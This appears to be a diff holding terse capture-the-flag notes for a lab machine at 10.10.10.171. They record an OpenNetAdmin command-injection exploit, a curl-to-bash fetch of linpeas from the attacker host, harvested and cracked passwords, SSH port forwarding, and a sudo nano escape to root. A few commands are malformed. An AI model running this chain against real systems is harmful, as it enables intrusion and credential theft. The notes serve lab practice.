@@ -1,0 +1,30 @@
+//OpenNetAdmin -> command injection
+//47691.sh is the exploit
+tr -d '\r' < 47691.sh > 47691_fixed.sh		//deletes windows line breaks
+./47691_fixed.sh http://10.10.10.171/ona/	//shell as www-data
+/usr/bin/python3-c'import pty;pty.spawn("/bin/bash")'	//functional web
+//LinEnum.sh does not retyrb anything interesting
+curl10.10.14.2/linpeas.sh|bash
+/var/www/html/ona/local/config/database_settings.inc.php
+ona_sys:n1nj4W4rri0R!
+ssh jimmy@10.10.10.171		//got jimmy's shell
+
+find / -type f -not -path "/sys/*" -not -path "/var/lib/*" -not -path "/proc*" -not -path "/run*" -newermt 2019-11-22 ! -newermt 2020-11-23 2>/dev/null
+/etc/apache2/sites-enabled/internal.conf	//Joanna's virtual host on port 52846
+/var/www/internal/index.php			//hash
+//Crackstation:
+00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1:Revealed
+ssh -R 1337:127.0.0.1:52946 root@<local_kali_ip>	//port forwarding to access the app
+curl http://127.0.0.1:52946/main.php 				//or simply do it locally, apply auth with jimmy's pass to access the page and get a private certificate
+ssh2john key > hash
+john hash --wordlist=rockyou
+joanna:bloodninjas
+ssh -i key joanna@10.10.10.171
+
+//PrivEsc
+sudo -l
+https://gtfobins.github.io/
+sudo -u root /bin/nano /opt/priv
+ctrl R
+ctrl X
+reset; sh 1>&0 2>&0	//got shell as root
